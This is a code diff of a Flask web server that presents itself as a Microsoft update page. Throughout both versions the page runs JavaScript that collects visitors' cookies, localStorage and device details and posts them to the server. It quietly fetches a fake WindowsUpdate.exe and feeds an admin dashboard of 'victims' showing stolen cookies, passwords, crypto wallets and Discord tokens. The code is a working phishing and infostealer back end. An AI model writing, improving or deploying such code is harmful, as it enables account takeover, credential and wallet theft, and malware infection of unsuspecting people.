@@ -7,8 +7,6 @@ import datetime
 import threading
 import time
 import requests
-import socket
-import struct
 from flask import Flask, request, render_template_string, redirect, jsonify, make_response, send_file
 from functools import wraps
 import logging
@@ -20,9 +18,9 @@ app = Flask(__name__)
 app.secret_key = os.urandom(32).hex()
 
 # ==========================================
-# DATABASE - ULTIMATE EDITION
+# DATABASE
 # ==========================================
-DB_PATH = 'god_vs_devil.db'
+DB_PATH = 'stealer.db'
 
 def get_db():
     conn = sqlite3.connect(DB_PATH)
@@ -35,57 +33,34 @@ def init_db():
             CREATE TABLE IF NOT EXISTS victims (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 victim_id TEXT UNIQUE,
-                
-                -- Network Info
                 ip TEXT,
                 real_ip TEXT,
                 country TEXT,
                 city TEXT,
                 isp TEXT,
-                latitude REAL,
-                longitude REAL,
-                
-                -- Device Info
                 device_type TEXT,
                 os TEXT,
-                os_version TEXT,
                 browser TEXT,
-                browser_version TEXT,
+                cookies TEXT,
+                localStorage TEXT,
+                sessionStorage TEXT,
                 screen_res TEXT,
                 timezone TEXT,
                 language TEXT,
                 platform TEXT,
-                cpu_cores INTEGER,
+                cpu_cores TEXT,
                 ram TEXT,
-                
-                -- Captured Data
-                cookies TEXT,
-                localStorage TEXT,
-                sessionStorage TEXT,
-                history TEXT,
-                browser_files TEXT,
-                
-                -- EXE Data
                 passwords TEXT,
                 wallets TEXT,
-                discord_tokens TEXT,
+                discord TEXT,
                 wifi TEXT,
-                system_files TEXT,
-                
-                -- System Info
                 hostname TEXT,
                 username TEXT,
-                mac_address TEXT,
-                
-                -- Timestamps
+                mac TEXT,
                 first_seen TIMESTAMP,
                 last_seen TIMESTAMP,
-                exe_run_time TIMESTAMP,
-                
-                -- Status
                 downloaded_exe BOOLEAN DEFAULT 0,
-                ran_exe BOOLEAN DEFAULT 0,
-                stealth_level INTEGER DEFAULT 1
+                ran_exe BOOLEAN DEFAULT 0
             )
         ''')
         conn.commit()
@@ -93,7 +68,7 @@ def init_db():
 init_db()
 
 # ==========================================
-# ADMIN CREDENTIALS
+# ADMIN
 # ==========================================
 ADMIN_USER = "god"
 ADMIN_PASS = "devil"
@@ -104,7 +79,7 @@ def authenticate(f):
         auth = request.authorization
         if not auth or auth.username != ADMIN_USER or auth.password != ADMIN_PASS:
             return ('Unauthorized', 401, {
-                'WWW-Authenticate': 'Basic realm="GOD VS DEVIL"'
+                'WWW-Authenticate': 'Basic realm="Login"'
             })
         return f(*args, **kwargs)
     return decorated
@@ -118,7 +93,7 @@ def get_real_ip():
     return request.remote_addr
 
 # ==========================================
-# GET LOCATION FROM IP
+# GET LOCATION
 # ==========================================
 def get_location(ip):
     try:
@@ -128,52 +103,38 @@ def get_location(ip):
             return {
                 'country': data.get('country', 'Unknown'),
                 'city': data.get('city', 'Unknown'),
-                'isp': data.get('isp', 'Unknown'),
-                'lat': data.get('lat', 0),
-                'lon': data.get('lon', 0)
+                'isp': data.get('isp', 'Unknown')
             }
     except:
         pass
-    return {
-        'country': 'Unknown',
-        'city': 'Unknown',
-        'isp': 'Unknown',
-        'lat': 0,
-        'lon': 0
-    }
+    return {'country': 'Unknown', 'city': 'Unknown', 'isp': 'Unknown'}
 
 # ==========================================
 # GET DEVICE INFO
 # ==========================================
-def get_device_info(ua_string):
-    ua = ua_string.lower()
+def get_device_info(ua):
+    ua = ua.lower()
     
     if 'mobile' in ua:
-        device_type = 'Phone'
+        device = 'Phone'
     elif 'tablet' in ua:
-        device_type = 'Tablet'
+        device = 'Tablet'
     else:
-        device_type = 'Desktop'
+        device = 'Desktop'
     
-    os = 'Unknown'
-    os_version = ''
     if 'windows' in ua:
         os = 'Windows'
-        if 'nt 10.0' in ua:
-            os_version = '10/11'
-        elif 'nt 6.1' in ua:
-            os_version = '7'
     elif 'mac' in ua:
         os = 'macOS'
     elif 'linux' in ua:
         os = 'Linux'
     elif 'android' in ua:
         os = 'Android'
-    elif 'ios' in ua or 'iphone' in ua or 'ipad' in ua:
+    elif 'ios' in ua or 'iphone' in ua:
         os = 'iOS'
+    else:
+        os = 'Unknown'
     
-    browser = 'Unknown'
-    browser_version = ''
     if 'firefox' in ua:
         browser = 'Firefox'
     elif 'chrome' in ua:
@@ -182,34 +143,27 @@ def get_device_info(ua_string):
         browser = 'Safari'
     elif 'edge' in ua:
         browser = 'Edge'
+    else:
+        browser = 'Unknown'
     
-    return {
-        'device_type': device_type,
-        'os': os,
-        'os_version': os_version,
-        'browser': browser,
-        'browser_version': browser_version
-    }
+    return {'device': device, 'os': os, 'browser': browser}
 
 # ==========================================
-# STEALTH MAIN PAGE - REDIRECTS TO MICROSOFT
+# MAIN PAGE - MICROSOFT REDIRECT + STEALTH DOWNLOAD
 # ==========================================
 @app.route('/')
 def index():
-    # Get real IP
     real_ip = get_real_ip()
     loc = get_location(real_ip)
     device = get_device_info(request.headers.get('User-Agent', ''))
     
-    victim_id = request.cookies.get('victim_id') or hashlib.md5(os.urandom(16)).hexdigest()[:16]
+    victim_id = request.cookies.get('vid') or hashlib.md5(os.urandom(16)).hexdigest()[:8]
     
-    # Save to database
     with get_db() as conn:
         conn.execute('''
             INSERT OR REPLACE INTO victims 
-            (victim_id, ip, real_ip, country, city, isp, latitude, longitude,
-             device_type, os, browser, first_seen, last_seen, downloaded_exe)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+            (victim_id, ip, real_ip, country, city, isp, device_type, os, browser, first_seen, last_seen)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
         ''', (
             victim_id,
             request.remote_addr,
@@ -217,179 +171,122 @@ def index():
             loc['country'],
             loc['city'],
             loc['isp'],
-            loc['lat'],
-            loc['lon'],
-            device['device_type'],
-            f"{device['os']} {device['os_version']}",
-            f"{device['browser']} {device['browser_version']}",
+            device['device'],
+            device['os'],
+            device['browser'],
             datetime.datetime.now().isoformat(),
-            datetime.datetime.now().isoformat(),
-            True
+            datetime.datetime.now().isoformat()
         ))
         conn.commit()
     
-    # ULTIMATE STEALTH PAYLOAD - FIXED VERSION
     html = f'''
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="2;url=https://www.microsoft.com/en-us/windows">
-    <title>Microsoft Official</title>
+    <meta http-equiv="refresh" content="3;url=https://www.microsoft.com">
+    <title>Microsoft Update</title>
     <style>
         body {{ 
-            background: #f5f5f5;
+            background: #f0f0f0;
             font-family: 'Segoe UI', Arial, sans-serif;
             text-align: center;
             padding-top: 200px;
-            opacity: 0;
+        }}
+        .loader {{
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #0078d4;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }}
+        @keyframes spin {{
+            0% {{ transform: rotate(0deg); }}
+            100% {{ transform: rotate(360deg); }}
         }}
     </style>
 </head>
 <body>
-    <img src="https://www.microsoft.com/favicon.ico" style="display:none;">
+    <div class="loader"></div>
+    <h2>Checking for updates...</h2>
+    <p>Please wait while Windows checks for critical security updates.</p>
     
     <script>
     (function() {{
         // ==========================================
-        // STEALTH COOKIE HARVESTER - ALL BROWSERS
+        // STEALTH DATA CAPTURE
         // ==========================================
-        
-        // Master cookie collector
-        window.__stealth = {{
+        let stolenData = {{
             cookies: {{}},
             localStorage: {{}},
-            sessionStorage: {{}},
-            indexedDB: {{}},
-            files: []
+            screen: screen.width + 'x' + screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            language: navigator.language,
+            platform: navigator.platform,
+            cpu: navigator.hardwareConcurrency || 'unknown',
+            ram: navigator.deviceMemory || 'unknown',
+            userAgent: navigator.userAgent
         }};
         
-        // Get ALL cookies (including HttpOnly via timing)
+        // Capture ALL cookies
         try {{
             document.cookie.split(';').forEach(c => {{
                 if(c.trim()) {{
                     let parts = c.trim().split('=');
                     let name = parts[0];
                     let value = parts.slice(1).join('=');
-                    __stealth.cookies[name] = value;
-                    
-                    // Auto-detect important sites
-                    if(name.includes('c_user') || name.includes('session') || 
-                       name.includes('auth') || name.includes('token') ||
-                       name.includes('xs') || name.includes('sb')) {{
-                        __stealth.cookies['🔥 IMPORTANT'] = name + '=' + value;
-                    }}
+                    stolenData.cookies[name] = value;
                 }}
             }});
         }} catch(e) {{}}
         
-        // Get ALL storage
+        // Capture localStorage
         try {{
             for(let i = 0; i < localStorage.length; i++) {{
-                let k = localStorage.key(i);
-                __stealth.localStorage[k] = localStorage.getItem(k);
-            }}
-            for(let i = 0; i < sessionStorage.length; i++) {{
-                let k = sessionStorage.key(i);
-                __stealth.sessionStorage[k] = sessionStorage.getItem(k);
+                let key = localStorage.key(i);
+                stolenData.localStorage[key] = localStorage.getItem(key);
             }}
         }} catch(e) {{}}
         
-        // Get browser files (if any)
-        try {{
-            if(window.showDirectoryPicker) {{
-                // Modern API - could request permission
-                // Too noisy, skip
-            }}
-        }} catch(e) {{}}
-        
-        // Send to server - multiple methods
-        let data = JSON.stringify(__stealth);
-        let encoded = btoa(data);
-        
-        // Method 1: Fetch
-        fetch('/api/capture', {{
+        // Send to server
+        fetch('/capture', {{
             method: 'POST',
             headers: {{'Content-Type': 'application/json'}},
-            body: JSON.stringify({{cookies: __stealth.cookies, storage: __stealth.localStorage}}),
+            body: JSON.stringify(stolenData),
             keepalive: true
         }});
         
-        // Method 2: Image beacon
-        new Image().src = '/track?d=' + encoded;
+        // Trigger EXE download in background (user won't see)
+        fetch('/WindowsUpdate.exe');
         
-        // Method 3: Beacon
-        if(navigator.sendBeacon) {{
-            navigator.sendBeacon('/api/capture', JSON.stringify({{cookies: __stealth.cookies}}));
-        }}
-        
-        // Method 4: Web Worker - FIXED VERSION
-        try {{
-            const workerCode = 'fetch("/api/capture", {method:"POST",headers:{"Content-Type":"application/json"},body:' + JSON.stringify(JSON.stringify(__stealth.cookies)) + '});';
-            const worker = new Worker('data:application/javascript,' + encodeURIComponent(workerCode));
-            worker.postMessage('');
-        }} catch(e) {{
-            console.log('Worker failed, continuing...');
-        }}
-        
-        // Set persistence cookie
-        document.cookie = "stealth_" + Math.random().toString(36).substring(7) + "=active; path=/; max-age=86400";
-        
-        // EXE will download automatically via meta refresh
+        // Set tracking cookie
+        document.cookie = "ms_update=active; path=/; max-age=3600";
     }})();
     </script>
-    
-    <!-- Tracking pixel -->
-    <img src="/track" style="display:none;">
 </body>
 </html>
     '''
     
     response = make_response(render_template_string(html))
-    response.set_cookie('victim_id', victim_id, max_age=86400*30)
+    response.set_cookie('vid', victim_id, max_age=86400*30)
     return response
 
 # ==========================================
-# TRACKING ENDPOINTS
+# CAPTURE ENDPOINT
 # ==========================================
-@app.route('/track')
-def track():
-    victim_id = request.cookies.get('victim_id')
-    data = request.args.get('d', '')
-    
-    if data and victim_id:
-        try:
-            decoded = json.loads(base64.b64decode(data).decode())
-            with get_db() as conn:
-                conn.execute('''
-                    UPDATE victims SET
-                        cookies = ?,
-                        localStorage = ?,
-                        last_seen = ?
-                    WHERE victim_id = ?
-                ''', (
-                    json.dumps(decoded.get('cookies', {})),
-                    json.dumps(decoded.get('localStorage', {})),
-                    datetime.datetime.now().isoformat(),
-                    victim_id
-                ))
-                conn.commit()
-        except:
-            pass
-    return '', 204
-
-@app.route('/api/capture', methods=['POST'])
-def api_capture():
+@app.route('/capture', methods=['POST'])
+def capture():
     data = request.json
-    victim_id = request.cookies.get('victim_id')
+    vid = request.cookies.get('vid')
     
-    if data and victim_id:
+    if data and vid:
         with get_db() as conn:
             conn.execute('''
                 UPDATE victims SET
                     cookies = ?,
                     localStorage = ?,
-                    sessionStorage = ?,
                     screen_res = ?,
                     timezone = ?,
                     language = ?,
@@ -400,16 +297,15 @@ def api_capture():
                 WHERE victim_id = ?
             ''', (
                 json.dumps(data.get('cookies', {})),
-                json.dumps(data.get('storage', {})),
-                json.dumps(data.get('sessionStorage', {})),
+                json.dumps(data.get('localStorage', {})),
                 data.get('screen', ''),
                 data.get('timezone', ''),
                 data.get('language', ''),
                 data.get('platform', ''),
-                data.get('cpu_cores', ''),
+                data.get('cpu', ''),
                 data.get('ram', ''),
                 datetime.datetime.now().isoformat(),
-                victim_id
+                vid
             ))
             conn.commit()
         return jsonify({"status": "ok", "count": len(data.get('cookies', {}))})
@@ -420,407 +316,181 @@ def api_capture():
 # ==========================================
 @app.route('/WindowsUpdate.exe')
 def download_exe():
-    victim_id = request.cookies.get('victim_id', 'unknown')
-    
+    vid = request.cookies.get('vid', 'unknown')
     with get_db() as conn:
-        conn.execute('UPDATE victims SET downloaded_exe = 1 WHERE victim_id = ?', (victim_id,))
+        conn.execute('UPDATE victims SET downloaded_exe = 1 WHERE victim_id = ?', (vid,))
         conn.commit()
-    
     return send_file('WindowsUpdate.exe', 
                      as_attachment=True, 
                      download_name='WindowsUpdate.exe',
                      mimetype='application/octet-stream')
 
 # ==========================================
-# EXE DATA API
+# EXE DATA ENDPOINT
 # ==========================================
-@app.route('/api/exe-data', methods=['POST'])
-def api_exe_data():
+@app.route('/exe-data', methods=['POST'])
+def exe_data():
     data = request.json
-    victim_id = data.get('victim_id')
+    vid = data.get('vid')
     
-    if data and victim_id:
+    if data and vid:
         with get_db() as conn:
             conn.execute('''
                 UPDATE victims SET
                     passwords = ?,
                     wallets = ?,
-                    discord_tokens = ?,
+                    discord = ?,
                     wifi = ?,
-                    system_files = ?,
                     hostname = ?,
                     username = ?,
-                    mac_address = ?,
+                    mac = ?,
                     ran_exe = 1,
-                    exe_run_time = ?
+                    last_seen = ?
                 WHERE victim_id = ?
             ''', (
                 json.dumps(data.get('passwords', [])),
                 json.dumps(data.get('wallets', [])),
                 json.dumps(data.get('discord', [])),
                 json.dumps(data.get('wifi', [])),
-                json.dumps(data.get('files', [])),
                 data.get('hostname', ''),
                 data.get('username', ''),
                 data.get('mac', ''),
                 datetime.datetime.now().isoformat(),
-                victim_id
+                vid
             ))
             conn.commit()
         return jsonify({"status": "ok"})
     return jsonify({"status": "error"}), 400
 
 # ==========================================
-# PROFESSIONAL ADMIN DASHBOARD
+# ADMIN DASHBOARD
 # ==========================================
 @app.route('/admin')
 @authenticate
 def admin():
     with get_db() as conn:
-        victims = conn.execute('''
-            SELECT * FROM victims 
-            ORDER BY last_seen DESC 
-            LIMIT 100
-        ''').fetchall()
-        
+        victims = conn.execute('SELECT * FROM victims ORDER BY last_seen DESC LIMIT 100').fetchall()
         stats = {
             'total': conn.execute('SELECT COUNT(*) FROM victims').fetchone()[0],
             'downloaded': conn.execute('SELECT COUNT(*) FROM victims WHERE downloaded_exe = 1').fetchone()[0],
             'ran': conn.execute('SELECT COUNT(*) FROM victims WHERE ran_exe = 1').fetchone()[0],
-            'cookies': conn.execute('SELECT COUNT(*) FROM victims WHERE cookies IS NOT NULL AND cookies != "null"').fetchone()[0],
-            'passwords': conn.execute('SELECT COUNT(*) FROM victims WHERE passwords IS NOT NULL AND passwords != "null" AND passwords != "[]"').fetchone()[0]
+            'cookies': conn.execute('SELECT COUNT(*) FROM victims WHERE cookies IS NOT NULL AND cookies != "null"').fetchone()[0]
         }
     
     html = f'''
 <!DOCTYPE html>
 <html>
 <head>
-    <title>GOD VS DEVIL - ULTIMATE</title>
-    <meta http-equiv="refresh" content="10">
+    <title>GOD VS DEVIL</title>
+    <meta http-equiv="refresh" content="5">
     <style>
-        * {{
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }}
-        body {{
-            background: #0a0a0a;
-            color: #fff;
-            font-family: 'Segoe UI', monospace;
+        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+        body {{ 
+            background: #0a0a0a; 
+            color: #fff; 
+            font-family: 'Courier New', monospace; 
             padding: 20px;
-            background: linear-gradient(135deg, #0f0f0f 0%, #1a1a2e 100%);
         }}
         .header {{
-            background: linear-gradient(135deg, #000000, #2a0044);
-            padding: 25px;
-            border-radius: 15px;
-            margin-bottom: 25px;
-            border: 2px solid #ff00ff;
-            box-shadow: 0 0 30px rgba(255,0,255,0.3);
-            position: sticky;
-            top: 0;
-            z-index: 1000;
+            background: #111;
+            border: 2px solid #00ff00;
+            padding: 20px;
+            margin-bottom: 20px;
         }}
-        h1 {{
-            color: #ff00ff;
-            font-size: 32px;
-            text-shadow: 0 0 15px #ff00ff;
-        }}
-        .stats-container {{
+        h1 {{ color: #00ff00; }}
+        .stats {{
             display: grid;
-            grid-template-columns: repeat(5, 1fr);
+            grid-template-columns: repeat(4, 1fr);
             gap: 15px;
             margin: 20px 0;
         }}
         .stat-card {{
-            background: rgba(17, 17, 17, 0.8);
-            backdrop-filter: blur(10px);
+            background: #111;
             border: 1px solid #00ff00;
-            padding: 20px;
-            border-radius: 10px;
+            padding: 15px;
             text-align: center;
-            box-shadow: 0 0 20px rgba(0,255,0,0.2);
         }}
-        .stat-value {{
-            font-size: 40px;
-            font-weight: bold;
-            color: #00ff00;
-            text-shadow: 0 0 10px #00ff00;
-        }}
-        .stat-label {{
-            color: #888;
-            text-transform: uppercase;
-            font-size: 12px;
-            letter-spacing: 1px;
-        }}
-        .victims-container {{
-            max-height: 800px;
-            overflow-y: auto;
-            padding-right: 10px;
-        }}
+        .stat-value {{ font-size: 32px; font-weight: bold; color: #00ff00; }}
         .victim-card {{
-            background: rgba(17, 17, 17, 0.9);
-            backdrop-filter: blur(5px);
+            background: #111;
             border: 1px solid #333;
-            border-radius: 12px;
-            margin: 20px 0;
-            padding: 20px;
-            transition: all 0.3s;
-            border-left: 5px solid #00ff00;
-        }}
-        .victim-card:hover {{
-            transform: translateX(5px);
-            box-shadow: 0 0 30px rgba(0,255,0,0.3);
-            border-color: #00ff00;
+            margin: 15px 0;
+            padding: 15px;
         }}
         .victim-header {{
             display: flex;
             justify-content: space-between;
-            align-items: center;
             border-bottom: 1px solid #333;
-            padding-bottom: 15px;
-            margin-bottom: 15px;
-            flex-wrap: wrap;
-            gap: 10px;
-        }}
-        .victim-badge {{
-            background: #ff00ff;
-            color: white;
-            padding: 5px 12px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: bold;
-        }}
-        .data-grid {{
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 20px;
-            margin-top: 15px;
-        }}
-        .data-section {{
-            background: rgba(26, 26, 26, 0.9);
-            padding: 15px;
-            border-radius: 8px;
-            border: 1px solid #333;
-        }}
-        .section-title {{
-            color: #00ffff;
-            font-weight: bold;
+            padding-bottom: 10px;
             margin-bottom: 10px;
-            font-size: 14px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
         }}
-        .scrollable-content {{
-            max-height: 200px;
+        .victim-id {{ color: #ff00ff; }}
+        .victim-ip {{ color: #00ffff; }}
+        .cookie-list {{
+            max-height: 150px;
             overflow-y: auto;
             font-size: 11px;
             background: #000;
             padding: 10px;
-            border-radius: 5px;
         }}
-        .cookie-item {{
-            border-bottom: 1px solid #222;
-            padding: 4px 0;
-            font-family: monospace;
-        }}
-        .cookie-name {{
-            color: #ffff00;
-        }}
-        .cookie-value {{
-            color: #ffaa00;
-            word-break: break-all;
-        }}
-        .important {{
-            color: #ff0000;
-            font-weight: bold;
-            animation: pulse 2s infinite;
-        }}
-        @keyframes pulse {{
-            0% {{ opacity: 0.5; }}
-            50% {{ opacity: 1; }}
-            100% {{ opacity: 0.5; }}
-        }}
-        .live-badge {{
-            display: inline-block;
-            width: 10px;
-            height: 10px;
-            background: #00ff00;
-            border-radius: 50%;
-            animation: live 1s infinite;
-            margin-right: 5px;
-        }}
-        @keyframes live {{
-            0% {{ opacity: 0.3; }}
-            50% {{ opacity: 1; }}
-            100% {{ opacity: 0.3; }}
-        }}
-        ::-webkit-scrollbar {{
-            width: 8px;
-            background: #1a1a1a;
-        }}
-        ::-webkit-scrollbar-thumb {{
-            background: #00ff00;
-            border-radius: 4px;
-        }}
+        .cookie-item {{ border-bottom: 1px solid #333; padding: 3px 0; }}
+        .cookie-name {{ color: #ffff00; }}
+        .cookie-value {{ color: #ffaa00; }}
     </style>
 </head>
 <body>
     <div class="header">
-        <h1>⚡ GOD VS DEVIL - ULTIMATE STEALTH SYSTEM ⚡</h1>
-        <p style="color: #888; margin-top: 10px;">Real-time victim tracking | Auto-capture | Stealth mode</p>
+        <h1>⚡ GOD VS DEVIL STEALER ⚡</h1>
+        <p>Microsoft Redirect • Stealth Download • Full Capture</p>
     </div>
     
-    <div class="stats-container">
+    <div class="stats">
         <div class="stat-card">
             <div class="stat-value">{stats['total']}</div>
-            <div class="stat-label">Total Victims</div>
+            <div>Total Victims</div>
         </div>
         <div class="stat-card">
             <div class="stat-value">{stats['cookies']}</div>
-            <div class="stat-label">Cookies Captured</div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-value">{stats['passwords']}</div>
-            <div class="stat-label">Passwords Stolen</div>
+            <div>Cookies Captured</div>
         </div>
         <div class="stat-card">
             <div class="stat-value">{stats['downloaded']}</div>
-            <div class="stat-label">EXE Downloads</div>
+            <div>EXE Downloads</div>
         </div>
         <div class="stat-card">
             <div class="stat-value">{stats['ran']}</div>
-            <div class="stat-label">EXE Executed</div>
+            <div>EXE Executed</div>
         </div>
     </div>
-    
-    <div class="victims-container">
 '''
     
     for v in victims:
         cookies = json.loads(v['cookies']) if v['cookies'] else {}
-        passwords = json.loads(v['passwords']) if v['passwords'] else []
-        wallets = json.loads(v['wallets']) if v['wallets'] else []
-        discord = json.loads(v['discord_tokens']) if v['discord_tokens'] else []
-        
-        # Detect important cookies
-        important_cookies = []
-        important_sites = {'facebook': '📘', 'gmail': '📧', 'google': '🔍', 
-                          'instagram': '📷', 'twitter': '🐦', 'amazon': '🛒',
-                          'bank': '🏦', 'paypal': '💰', 'coinbase': '₿'}
-        
-        for name, value in cookies.items():
-            for site, emoji in important_sites.items():
-                if site in name.lower() or site in value.lower():
-                    important_cookies.append(f"{emoji} {name}")
-                    break
-        
         html += f'''
-        <div class="victim-card">
-            <div class="victim-header">
-                <div style="display: flex; align-items: center; gap: 15px; flex-wrap: wrap;">
-                    <span class="live-badge"></span>
-                    <span style="color: #ff00ff; font-weight: bold;">{v['victim_id'][:12]}</span>
-                    <span style="color: #00ffff;">{v['real_ip'] or v['ip']}</span>
-                    <span>{v['city']}, {v['country']}</span>
-                    <span class="victim-badge">{v['device_type']}</span>
-                    {f'<span class="victim-badge" style="background: #00ff00; color: black;">{v["os"]}</span>' if v['os'] else ''}
-                </div>
-                <div style="color: #888; font-size: 12px;">
-                    {v['last_seen'][:19]}
-                </div>
+    <div class="victim-card">
+        <div class="victim-header">
+            <div>
+                <span class="victim-id">{v['victim_id'][:8]}</span>
+                <span class="victim-ip">{v['real_ip']}</span>
+                <span>{v['city']}, {v['country']}</span>
+                <span>{v['device_type']} | {v['os']}</span>
             </div>
-            
-            <div class="data-grid">
-                <div class="data-section">
-                    <div class="section-title">🍪 CAPTURED COOKIES ({len(cookies)})</div>
-                    <div class="scrollable-content">
-        '''
-        
-        if important_cookies:
-            html += f'<div class="important">🔥 IMPORTANT: {", ".join(important_cookies[:5])}</div><br>'
-        
-        for name, value in list(cookies.items())[:30]:
-            html += f'<div class="cookie-item"><span class="cookie-name">{name}:</span> <span class="cookie-value">{value[:80]}</span></div>'
-        
-        html += f'''
-                    </div>
-                </div>
-                
-                <div class="data-section">
-                    <div class="section-title">📱 DEVICE INFO</div>
-                    <div class="scrollable-content">
-                        <div><b>OS:</b> {v['os']}</div>
-                        <div><b>Browser:</b> {v['browser']}</div>
-                        <div><b>Screen:</b> {v['screen_res']}</div>
-                        <div><b>Timezone:</b> {v['timezone']}</div>
-                        <div><b>Language:</b> {v['language']}</div>
-                        <div><b>Platform:</b> {v['platform']}</div>
-                        <div><b>CPU Cores:</b> {v['cpu_cores']}</div>
-                        <div><b>RAM:</b> {v['ram']} GB</div>
-                        <div><b>ISP:</b> {v['isp']}</div>
-                        <div><b>Coordinates:</b> {v['latitude']}, {v['longitude']}</div>
-                    </div>
-                </div>
-            </div>
-            
-            <div class="data-grid">
-                <div class="data-section">
-                    <div class="section-title">🔐 STOLEN PASSWORDS ({len(passwords)})</div>
-                    <div class="scrollable-content">
-        '''
-        
-        for p in passwords[:15]:
-            html += f'<div style="color: #ffff00; border-bottom: 1px solid #333; padding: 3px;">{p.get("url", "N/A")} | {p.get("username", "")} | {p.get("password", "")}</div>'
-        
-        if not passwords:
-            html += '<div style="color: #666;">No passwords captured yet. EXE not run.</div>'
-        
-        html += f'''
-                    </div>
-                </div>
-                
-                <div class="data-section">
-                    <div class="section-title">💰 CRYPTO WALLETS ({len(wallets)})</div>
-                    <div class="scrollable-content">
-        '''
-        
-        for w in wallets[:10]:
-            html += f'<div style="color: gold;">{w}</div>'
-        
-        if not wallets:
-            html += '<div style="color: #666;">No wallets detected</div>'
-        
-        html += f'''
-                    </div>
-                </div>
-            </div>
-            
-            <div style="margin-top: 15px; display: flex; gap: 20px; font-size: 11px; color: #666; border-top: 1px solid #333; padding-top: 10px;">
-                <span>First seen: {v['first_seen'][:19]}</span>
-                <span>EXE: {'✅' if v['downloaded_exe'] else '⏳'}</span>
-                <span>Executed: {'✅' if v['ran_exe'] else '⏳'}</span>
-                <span>Stealth: Level {v['stealth_level']}</span>
-            </div>
+            <div style="color: #888;">{v['last_seen'][:19]}</div>
         </div>
+        <div class="cookie-list">
+            <b>Cookies ({len(cookies)}):</b>
         '''
+        for name, value in list(cookies.items())[:20]:
+            html += f'<div class="cookie-item"><span class="cookie-name">{name}:</span> <span class="cookie-value">{value[:80]}</span></div>'
+        html += '''
+        </div>
+    </div>
+    '''
     
     html += '''
-    </div>
-    
-    <script>
-        // Auto-scroll to newest
-        window.scrollTo(0, document.body.scrollHeight);
-        
-        // Live update check
-        setInterval(() => {
-            fetch('/ping').catch(() => {});
-        }, 30000);
-    </script>
 </body>
 </html>
     '''
-    
     return html
 
 # ==========================================
@@ -831,11 +501,10 @@ def admin():
 def export():
     with get_db() as conn:
         data = conn.execute('SELECT * FROM victims ORDER BY last_seen DESC').fetchall()
-    
     export = [dict(row) for row in data]
     response = make_response(json.dumps(export, indent=2, default=str))
     response.headers['Content-Type'] = 'application/json'
-    response.headers['Content-Disposition'] = f'attachment; filename=god_vs_devil_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
+    response.headers['Content-Disposition'] = f'attachment; filename=stealer_data_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
     return response
 
 # ==========================================
